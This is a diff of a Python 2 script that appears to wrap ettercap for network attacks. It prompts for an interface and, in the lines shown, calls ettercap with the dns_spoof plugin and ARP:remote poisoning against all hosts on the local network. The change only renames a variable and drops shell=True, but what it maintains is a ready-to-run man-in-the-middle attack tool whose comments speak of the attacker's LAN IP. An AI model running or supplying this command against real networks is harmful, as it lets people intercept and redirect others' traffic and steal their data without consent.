@@ -31,9 +31,9 @@ else:
 #Getting the Network Interface Card Information.
 #This is the interface that ettercap will listen on.
 print bcolors.OKGREEN
-nic = raw_input('Whats is your network interface?\n (example: eth0, wlan0)\n Interface: ')
-print ("Interface set to set to: %s.") % nic
-iface = "%s" % nic
+iface = raw_input('Whats is your network interface?\n (example: eth0, wlan0)\n Interface: ')
+print ("Interface set to set to: %s.") % iface
+iface = "%s" % iface
 print ("\n")
 
 #Define the attackers lan IP
@@ -85,5 +85,5 @@ print("#### NB: CTRL + C IS DISAPPRECIATED, USE Q FOR QUIT INSTEAD! ####")
 print bcolors.ENDC
 time.sleep(1)
 
-subprocess.call(['ettercap', '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',], shell=True)
+subprocess.call(['ettercap', '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',])
 exit(1)
